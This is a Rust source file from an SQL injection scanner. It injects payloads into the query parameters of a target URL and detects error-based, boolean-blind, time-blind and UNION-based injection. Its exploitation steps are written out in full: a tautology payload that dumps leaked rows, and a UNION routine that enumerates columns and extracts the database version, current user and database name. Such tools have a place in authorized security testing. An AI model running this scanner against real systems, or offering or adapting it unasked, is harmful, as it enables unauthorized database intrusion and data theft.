use crate::http;
use crate::payloads;
use anyhow::Ok;
use reqwest::Body;
use scraper::Html;
use scraper::Node::Document;
use scraper::Selector;
use scraper::selector;
use serde::de::value;
use url::Url;


pub fn scan(target_url: &str, cookie: Option<&str>, scan_type: &str) -> anyhow::Result<()>{
    let parsed = Url::parse(target_url)?;
    let  params: Vec<(String, String)> = parsed
        .query_pairs()
        .map(|(k, v)| (k.to_string(), v.to_string()))
        .collect();
    if params.is_empty(){
        println!("No query  parameters found. Nothing to inject.");
        return Ok(());
    }

    println!("Found {} Injectable parameters", params.len());


    let baseline = http::get(target_url, cookie)?;
    println!("Baseline: status= {}, body_len={}, time={}ms", baseline.status, baseline.body.len(), baseline.response_time_ms);
    
    let run_error = scan_type == "error" || scan_type == "all";
    let run_boolean = scan_type == "boolean" || scan_type == "all";
    let run_time = scan_type == "time" || scan_type == "all";
    let run_union = scan_type == "union" || scan_type == "all";
    
    for (param_name, _original_value) in &params {
        println!("\n--- Testing Param: {} ---", param_name);
        if run_error {
                let mut error_found = false;
                for payload in payloads::error_based()  {
                let injected_url = replace_param(target_url, param_name, payload)?;
                let res = http::get(&injected_url, cookie)?;
         
                if let Some(db) = super::detector::detect_error_based(&res.body) {
                    
                    println!("[VULN] Error-based SQLi | param: {} | DB: {} | payload: {}", param_name,db, payload);

                    let extract_url = replace_param(target_url, param_name, "1' OR '1'='1")?;
                    let extract_res = http::get(&extract_url, cookie)?;
                    let data = super::detector::extract_data(&extract_res.body);
                    if !data.is_empty() {
                        println!("\n Leaked data: {} rows:", data.len());
                        for row in &data  {
                            println!("      {}", row);
                        }
                    }
                    error_found = true;
                    break;
                }
            }
            if !error_found {
                println!("  Error-based: not detected");
            }
        }
        if run_boolean {
            let mut bool_found = false;
            for (true_payload, false_payload) in payloads::boolean_blind()  {
                let true_url = replace_param(target_url, param_name, true_payload)?;
                let false_url = replace_param(target_url, param_name, false_payload)?;
                let true_res = http::get(&true_url, cookie)?;
                let false_res = http::get(&false_url, cookie)?;
        
                if super::detector::detect_boolean_blind(baseline.body.len(), &true_res.body, &false_res.body) {
                    println!("[VULN] Boolean-Blind SQLi | param: {} | payload: {}", param_name, true_payload);
                    println!("   TRUE response:  {}bytes", true_res.body.len());
                    println!("   FALSE response: {}bytes", false_res.body.len());
                    println!("   Diff:           {}bytes", (true_res.body.len() as isize - false_res.body.len() as isize).abs());
                    bool_found = true;
                    break;
                }
            }
            if !bool_found {
                println!("  Boolean-Blind: not detected");
            }
        }
        if run_time {
            let mut time_found = false;
            for (payload, db_type) in payloads::time_blind()  {
                let injected_url = replace_param(target_url, param_name, payload)?;
                let res = http::get(&injected_url, cookie)?;
            
                if super::detector::detect_time_blind(baseline.response_time_ms, res.response_time_ms, 4000) {
                    println!("[VULN] Time-Blind SQLi | param: {} | DB: {} | payload: {}", param_name, db_type, payload);
                    println!("  Baseline time:  {}ms", baseline.response_time_ms);
                    println!("  Injected time:  {}ms", res.response_time_ms);
                    println!("  Delta:          {}ms", res.response_time_ms - baseline.response_time_ms);
                    time_found = true;
                    break;
                }
            }
            if !time_found {
                println!("  Time-Blind: not detected");
            }
        }
        if run_union {
            probe_union(target_url, param_name, cookie)?;
        }
    }
    println!("\n============= Scan Complete =============");
    Ok(())
}


fn probe_union(target_url: &str, param_name: &str, cookie: Option<&str>) -> anyhow::Result<()> {
    println!("  [UNION] step 1: Finding column count...");

    let mut col_count: u32 = 0;
    for n in 1..=20  {
        let payload = payloads::union_order_by(n);
        let url = replace_param(target_url, param_name, &payload)?;
        let res = http::get(&url, cookie)?;

        if super::detector::detect_error_based(&res.body).is_some() 
            || res.body.len() < 100
        {
            col_count = n - 1;
            break;
        }
    }

    if col_count == 0 {
        println!("  [UNION] Could not  determine column count");
        return Ok(());
    }
    println!("  [UNION] Column count: {}", col_count);

    println!("  [UNION] Step 2: Finding reflection column...");
    let mut reflection_col: Option<u32> = None;
    for pos in 0..col_count  {
        let payload = payloads::union_find_reflection(col_count, pos);
        let url = replace_param(target_url, param_name, &payload)?;
        let res = http::get(&url, cookie)?;

        if res.body.contains("sqli_test") {
            reflection_col = Some(pos);
            break;
        }
    }

    let reflect_pos = match reflection_col {
        Some(pos) => {
            println!("  [UNION] Reflection found at column: {}", pos + 1);
            pos
        }
        None => {
            println!("  [UNION] No reflection column found");
            return Ok(());
        }
    };

    println!("  [UNION] Step 3: Extracting data...\n");

    let extractions = vec![
        ("version()", "DB version"),
        ("user()", "Current User"),
        ("database()", "Database Name"),
    ];

    for (expr, label) in extractions  {
        let payload = payloads::union_extract(col_count, reflect_pos, expr);
        let url = replace_param(target_url, param_name, &payload)?;
        let res = http::get(&url, cookie)?;

        if let Some(value) = super::detector::extract_value(&res.body) {
            println!("  {}: {}", label, value);
        }

    }

    println!("\n[VULN] UNION-based SQLi | param: {} | columns: {}", param_name, col_count);
    Ok(())

}

fn replace_param(url_str: &str, param: &str, payload: &str) -> anyhow::Result<String>{
    let mut parsed = Url::parse(url_str)?;
    let new_query: Vec<(String, String)> = parsed
    .query_pairs() 
    .map(|(k, v)| {
        if k == param {
            (k.to_string(), payload.to_string())
        }else {
            (k.to_string(), v.to_string())
        }
    })
    .collect();

    parsed.query_pairs_mut().clear();
    for (k, v) in &new_query {
        parsed.query_pairs_mut().append_pair(k, v);
    }

    Ok(parsed.to_string())
}


